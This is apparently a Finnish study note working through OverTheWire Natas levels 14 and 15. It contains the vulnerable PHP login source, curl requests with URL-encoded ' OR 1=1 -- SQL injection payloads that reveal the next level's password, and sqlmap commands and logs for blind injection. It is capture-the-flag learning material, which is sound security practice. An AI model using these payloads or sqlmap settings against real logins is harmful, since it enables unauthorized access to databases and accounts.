#007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$link&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">mysqli_connect</span><span style="color: #007700">(</span><span style="color: #DD0000">'localhost'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'natas14'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'&lt;censored&gt;'</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">mysqli_select_db</span><span style="color: #007700">(</span><span style="color: #0000BB">$link</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'natas14'</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$query&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"SELECT&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;username=\""</span><span style="color: #007700">.</span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">[</span><span style="color: #DD0000">"username"</span><span style="color: #007700">].</span><span style="color: #DD0000">"\"&nbsp;and&nbsp;password=\""</span><span style="color: #007700">.</span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">[</span><span style="color: #DD0000">"password"</span><span style="color: #007700">].</span><span style="color: #DD0000">"\""</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"debug"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Executing&nbsp;query:&nbsp;</span><span style="color: #0000BB">$query</span><span style="color: #DD0000">&lt;br&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">mysqli_num_rows</span><span style="color: #007700">(</span><span style="color: #0000BB">mysqli_query</span><span style="color: #007700">(</span><span style="color: #0000BB">$link</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$query</span><span style="color: #007700">))&nbsp;&gt;&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Successful&nbsp;login!&nbsp;The&nbsp;password&nbsp;for&nbsp;natas15&nbsp;is&nbsp;&lt;censored&gt;&lt;br&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Access&nbsp;denied!&lt;br&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">mysqli_close</span><span style="color: #007700">(</span><span style="color: #0000BB">$link</span><span style="color: #007700">);<br />}&nbsp;else&nbsp;{<br /></span><span style="color: #0000BB">?&gt;<br /></span><br />&lt;form&nbsp;action="index.php"&nbsp;method="POST"&gt;<br />Username:&nbsp;&lt;input&nbsp;name="username"&gt;&lt;br&gt;<br />Password:&nbsp;&lt;input&nbsp;name="password"&gt;&lt;br&gt;<br />&lt;input&nbsp;type="submit"&nbsp;value="Login"&nbsp;/&gt;<br />&lt;/form&gt;<br /><span style="color: #0000BB">&lt;?php&nbsp;</span><span style="color: #007700">}&nbsp;</span><span style="color: #0000BB">?&gt;<br /></span>&lt;div&nbsp;id="viewsource"&gt;&lt;a&nbsp;href="index-source.html"&gt;View&nbsp;sourcecode&lt;/a&gt;&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></span>
</code>                                                                                                                ```


syötin jotakin satunnaista et ainakin tooimii ja kertookin jotakin

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org?debug&username=something&&passsword=random" 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<br />
<b>Notice</b>:  Undefined index: password in <b>/var/www/natas/natas14/index.php</b> on line <b>19</b><br />
Executing query: SELECT * from users where username="something" and password=""<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


vähä kuin aikaisemmat testit `"admin"` ja `"admin"`

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin&&password=admin%22%20OR%201=1%E2%80%93%20&&password=admin"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
Executing query: SELECT * from users where username="admin" and password="admin"<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```



nyt tässä on syötettu url enkoodattuna toi **"admin"' OR 1=1 --"** muodosta sinne URL username ja password kentään

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin%22%27%20OR%201%3D1%20--&&password=admin%27%20OR%201%3D1%20--%22"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
Executing query: SELECT * from users where username="admin"' OR 1=1 --" and password="admin' OR 1=1 --""<br>Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
                                                                                                                                    
```


## Kali Linux - SQLMAP version - START HERE
natas14 : z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ


sqlmap -u "http://natas14.natas.labs.overthewire.org/" \
  --auth-type Basic --auth-cred "natas14:YOURPASSWORD" \
  --data="username=admin&password=admin" \
  --level=5 --risk=3 --batch

`sqlmap -u "http://natas14.natas.labs.overthewire.org/"" --batch --risk=3 --level=5`


🛠️ POST-pyyntö (esim. lomake)
sqlmap -u "http://natas14.natas.labs.overthewire.org/" --data "username=admin&password=admin" --batch

🔐 HTTP Basic Authentication (esim. Natas14)
sqlmap -u "http://natas14.natas.labs.overthewire.org/index.php" \
  --auth-type Basic \
  --auth-cred "natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" \
  --data "username=admin&password=admin" \
  --batch





---

## Harjoitusta kohti mestariksi

Alkuum meneekin `' OR 1=1 --` - koska se on perusideana mikä lähtee harjoittelusta. Sitä näkee nopeasti, reagoi järjestelmän jollakin tavalla, että onnistuuko kirjautuminen vai tuleeko virhettä, jäätyykö pyyntö ja tms. Tämä periaatteessa toimii kuin ensimmäinen _pingi_ eli testaa onko järjestelmässä injektiota. 

Periaatteessa tämä `' OR 1=1 --` - voi toimia pienenä lunttilappuna ja pikaisella koodina.

Jos taso menee vaikeammaksi niin lomake kenttään käytä suodatusta  ' - merkkiä 

Muita vaiheita tulee mukaan:
- Blind SQLi (testataan vaikka `AND 1=1` vs. `AND 1=2` ja katsotaan käyttäytyminen)
- Time-based SQLi (esim. `SLEEP(5)`-pohjaiset injektiot)
- Automatisointi (sqlmap) kun payloadit monimutkaistuvat


## SQL injektio kali linux:issa

`curl "http://target.site/login?username=admin' OR 1=1 --&password=whatever"`

```
curl -X POST http://target.site/login \
  -d "username=admin' OR 1=1 --&password=whatever"
```

**Sqlmap** - joka antaa automaattisesti erilaisia sql injektio, et tunnistaa classic/blind/time-based ja union pohjaisia, jne.
`sqlmap -u "http://target.site/login?username=admin&password=test" --batch --risk=3 --level=5`


## Selaimen SQL injektio

` " ` - kokeilin toista erikoismerkkiä, mutta ainakin toimii ja antoi seuraavan vihjeensä, sekä muutama testi ainakin näyttävän toimii.

```
Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24
```


Kun käytät SQL-injektiota URLin kautta, sinun täytyy URL-enkoodata erikoismerkit, jotta ne menevät palvelimelle oikein — muuten selain tai palvelin tulkkaa ne väärin tai estää pyynnön kokonaan.

`' OR 1=1 --`- on enkoodattuna muodossa `%27%20OR%201%3D1%20--`


🔎 Miksi enkoodata?
Web-palvelimet ja selaimet odottavat, että URL:ssa on vain tietyt sallitut merkit. Jos laitat esimerkiksi ' (heittomerkki) suoraan URLiin, se voi rikkoa pyynnön tai aiheuttaa virheen jo ennen kuin se ehtii tietokantaan asti.

esim. `curl "http://example.com/login.php?username=admin%27%20OR%201%3D1%20--&password=whatever"`


http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin&&password=admin%22%20OR%201=1%E2%80%93%20&&password=admin


Executing query: SELECT * from users where username="admin" and password="admin' OR 1=1 --""

Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24
Access denied!

**nyt toimii**
Nyt alkoi pelittää, koska laitoin ton `' OR 1=1 --` enkodaatun muodossa **username=admin** tilalle (jälkimmäisessä) perässä, ja sama pätee salasansa.
http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin%22%27%20OR%201%3D1%20--&&password=admin%27%20OR%201%3D1%20--%22

dekoodattuna menisi näin:
username = admin"' OR 1=1 --
password = admin' OR 1=1 --"



**`' OR 1=1 --`** - enkoodattuna:
Tämä enkodaattu pätee myös todellisuudessaan kirjauttumisen formaattissa ja URL:issa , periaate pätee todellisuudessakin web-sovelluksissa, jos ne ovat haavoittuvia SQL-injektiolle.

Esim. klassisessa haavoittuvusta PHP-koodista:
```
$username = $_GET["username"];
$password = $_GET["password"];

$query = "SELECT * FROM users WHERE username=\"$username\" AND password=\"$password\"";
```

Tämä muuttuu: `SELECT * FROM users WHERE username="admin" OR 1=1 --" AND password="..."`


**curl** komento POST-pyyntö SQL-injektiolla:
```
curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
  -X POST "http://natas14.natas.labs.overthewire.org/" \
  -d "username=admin\" OR 1=1 --&password=irrelevant" \
  --compressed
```

-X POST: tehdään POST-pyyntö
-d: data, joka normaalisti tulisi lomakkeesta:
--compressed: pakkaustuki, joskus tarpeen Overthewire-labroissa


**Toinen vinkki**: tarkalleen mitä kysely tekee: 
```
curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
  -X POST "http://natas14.natas.labs.overthewire.org/?debug=1" \
  -d "username=admin\" OR 1=1 --&password=irrelevant"
```

## SQLmap - komento

tehokkuus ja laajuus säädetään sqlmapissa --level ja --risk -asetuksilla. Ne vaikuttavat siihen, kuinka aggressiivisesti ja syvällisesti sqlmap hyökkää.

Asetus	Merkitys
--level=1-5	- Kuinka laajasti testataan parametreja (1 = nopea, 5 = kaikki mahdolliset)
--risk=1-3	- Kuinka "riskialttiita" hyökkäyksiä käytetään (1 = turvallisia, 3 = voivat rikkoa)

**ESIM**:
SQLMAP komento POST-pyyntö esim:
```
sqlmap -u "http://natas14.natas.labs.overthewire.org/" \
  --auth-type Basic --auth-cred "natas14:YOURPASSWORD" \
  --data="username=admin&password=admin" \
  --level=5 --risk=3 --batch
```

🧠 Selitykset:
-u: URL-osoite (ei tarvitse query-parametreja tässä, koska käytetään --data)

--auth-type Basic: HTTP Basic Auth

--auth-cred: käyttäjä:salasana

--data: POST-data, jota lomake lähettää

--level=5: testaa kaikki kentät ja mutaatiot

--risk=3: kokeilee myös vaarallisempia hyökkäyksiä (esim. viiveet, tiedonhaku)

--batch: automaattivastaukset (ei kysy interaktiivisesti)



## Level 14 - 4 linkkejä ja ohjeita; 

https://nils-maeurer.de/post/overthewire-natas14-15/
https://www.abatchy.com/2016/11/natas-level-14-and-15

https://www.youtube.com/watch?v=cCQFblftpr8


https://learnhacking.io/overthewire-natas-level-14-walkthrough/

https://medium.com/@enesaladag/overthewires-natas14-b83d28872ffe


---

# Natas 15 - START HERE

natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx


Tämä näyttää vähä samankaltaiselta kuin level 14:ssa, mutta vaikeampi taso. Ainakin **index-source** välilehdessä lukee siellä on luotu tietokannan yksittäinen sarakke/taulukko mikälie _käyttäjät_ että on _username:password_ ja tässä on koodattuna ainaki perus PHP-koodikielellä.

Tässä skriptissä ainakin näkyvinsä, jos on olemassa oleva _username_ niin se kertoo tämä on jo varattu ja jne. sekä ainakin avainsanoja haavoittuvuudesta kiinnostaa kuten `debug` , `username` ainakin, että tarkistaa onko sellainen käyttäjänimi jo olemassa entuudestaan.

Voi olla tähän SQLmap komentoa/työkalua ei suoraan auta, koska tämä on tehokkaampi tehdä **manuaaliselal hyökkäyksellä** , esim. kirjain kerrallaan testaus: `natas16" AND SUBSTRING(password,1,1) = "a"` jne.


Pientä kokeilua erissä muodossa mm:
-  Kokeilin esim. yksi (username) niin tarkistaa "check existence" - no ainakin kokeilin "_admin123_" - ja tuloksena "This user doesn't exist" 
- toinen testi kokeilin syöttää username kentään "bob" - ja ainakin tämä tulosti _This user exists._ eli vain tietyt nimet
- kolmanetena syötin **admin" OR 1=1 --"** - sehän antoi _Error in query._ tuloksensa. 


Tässä tuloksena ainakin se tarkistaa sen tietokannan mukaisen datan että täsmentyykö se nimi, mitä käyttäjä syöttää niin täsmentyykö sinne taulukkoon. Toi "bob" nimestä, jonka toistettu on tämän tason nimetyt tietokannan taulukkon nimet ja vain rajoitetut nimet - sellaiset helpot mm. alice , bob , charlie.


## Natas 15 - Kali linux prosessi - START HERE

Perus selvittämistä ja jne, että kertoo ainakin SQL-injektio steppi ei toimi ja sama idea URL:lin perään hakusana, joten päädyttiin käyttää SQLmap:iä. 


Kokeillaan aikaisempia , että antaako niistä ekana mitään vastausta

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx "http://natas15.natas.labs.overthewire.org"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


Tämä ei antanut kauheasti mitään tuloksia ainakaan lukien, mutta paitsi jotakin testeistä on infoja mistä on kyse tässä level:issä:
```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php" \
  --auth-type Basic \
  --auth-cred "natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" \
  --data "username=admin" \               
  --batch
        ___
       __H__                                                                                                                   
 ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                       
|_ -| . [']     | .'| . |                                                                                                      
|___|_  [,]_|_|_|__,|  _|                                                                                                      
      |_|V...       |_|   https://sqlmap.org                                                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:15:04 /2025-05-18/

[10:15:04] [INFO] testing connection to the target URL
[10:15:06] [INFO] testing if the target URL content is stable
[10:15:07] [INFO] target URL content is stable
[10:15:07] [INFO] testing if POST parameter 'username' is dynamic
[10:15:07] [WARNING] POST parameter 'username' does not appear to be dynamic
[10:15:08] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[10:15:08] [INFO] testing for SQL injection on POST parameter 'username'
[10:15:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:15:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:15:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:15:16] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:15:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:15:17] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:15:18] [INFO] testing 'Generic inline queries'
[10:15:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:15:18] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)                                                                                        
[10:15:18] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:15:19] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:15:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:15:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:15:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:15:21] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:15:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:15:21] [WARNING] POST parameter 'username' does not seem to be injectable
[10:15:21] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[10:15:21] [WARNING] your sqlmap version is outdated

[*] ending @ 10:15:21 /2025-05-18/
```



Tämä toisti lisäparametrejä jos halutaisi syvempää testausta, ainakin koskien rajoittaa testin `--technique=B` **Boolean-based blind SQLi:hin** ja `--batch` hyväksyy oletusvastauksia automaattisesti. Tuossa toistui paljon riviä, että skippasin osan. Sekä SQLMap teki perusteellisen sarjan testejä tarkistaakseen, onko `username`-parametri haavoittuvainen blind SQL injectionille eri tietokantaympäristöissä, mutta ei löytänyt haavoittuvuutta, koska se ei saanut tunnistettua onnistuneen injektion vastaussisältöä ilman lisäohjausta käyttäjältä.



```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?username=test" \
--auth-type Basic \
--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
--level 5 --risk 3 --batch --technique=B
        ___
       __H__                                                                                                                   
 ___ ___[(]_____ ___ ___  {1.8.5#stable}                                                                                       
|_ -| . ["]     | .'| . |                                                                                                      
|___|_  [.]_|_|_|__,|  _|                                                                                                      
      |_|V...       |_|   https://sqlmap.org                                                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:40:44 /2025-05-18/
....


[10:40:46] [WARNING] heuristic (basic) test shows that GET parameter 'username' might not be injectable
[10:40:46] [INFO] testing for SQL injection on GET parameter 'username'
[10:40:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:40:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[10:40:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[10:41:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:41:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:41:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[10:41:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[10:41:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[10:41:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:41:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:41:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[10:41:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[10:41:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[10:41:26] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[10:41:30] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[10:41:43] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[10:41:59] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[10:42:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[10:42:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:42:14] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:42:17] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[10:42:23] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[10:42:26] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[10:42:30] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[10:42:35] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[10:42:39] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[10:42:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:42:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
....

[10:42:48] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[10:42:48] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[10:42:48] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[10:42:48] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[10:42:48] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[10:42:48] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[10:42:49] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[10:42:49] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[10:42:49] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[10:42:49] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
.....
[10:51:04] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[10:51:05] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[10:51:06] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[10:51:07] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[10:51:10] [WARNING] parameter 'Host' does not seem to be injectable
[10:51:10] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[10:51:10] [WARNING] your sqlmap version is outdated

[*] ending @ 10:51:10 /2025-05-18/

```


Tässä viimeisessä (alempi tulos) kohdassa ajattelin keskeyttää, että laittaa "e" niin ainakin kertoi jotakin prosessia.. Sekä ainakin SQL injektiosta löysi POST parametrin koskeva haavoittuvuutta **Boolean-based** ja **time-based blind** injektiolle just tämä osuus: `username=natas16" AND 1660=1660--`


```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
--auth-type Basic \
--string "This user exists" \
--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
--data "username=natas16" \
--level=5 --risk=3
        ___
       __H__                                                                                                                   
 ___ ___[(]_____ ___ ___  {1.8.5#stable}                                                                                       
|_ -| . [(]     | .'| . |                                                                                                      
|___|_  ["]_|_|_|__,|  _|                                                                                                      
      |_|V...       |_|   https://sqlmap.org                                                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:30:26 /2025-05-18/

[11:30:27] [INFO] testing connection to the target URL
[11:30:27] [INFO] testing if the provided string is within the target URL page content
[11:30:27] [INFO] testing if POST parameter 'username' is dynamic
[11:30:27] [INFO] POST parameter 'username' appears to be dynamic
[11:30:27] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[11:30:27] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks


[11:30:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:30:51] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[11:30:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:30:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:30:51] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[11:30:51] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[11:30:58] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')                                                                                                                            
[11:30:59] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[11:31:05] [INFO] testing 'Generic UNION query (80) - 21 to 40 columns'
[11:31:07] [INFO] testing 'Generic UNION query (80) - 41 to 60 columns'
[11:31:08] [INFO] testing 'Generic UNION query (80) - 61 to 80 columns'
[11:31:09] [INFO] testing 'Generic UNION query (80) - 81 to 100 columns'
[11:31:11] [INFO] testing 'MySQL UNION query (80) - 1 to 20 columns'
[11:31:13] [INFO] testing 'MySQL UNION query (80) - 21 to 40 columns'
[11:31:14] [INFO] testing 'MySQL UNION query (80) - 41 to 60 columns'
[11:31:16] [INFO] testing 'MySQL UNION query (80) - 61 to 80 columns'
[11:31:17] [INFO] testing 'MySQL UNION query (80) - 81 to 100 columns'
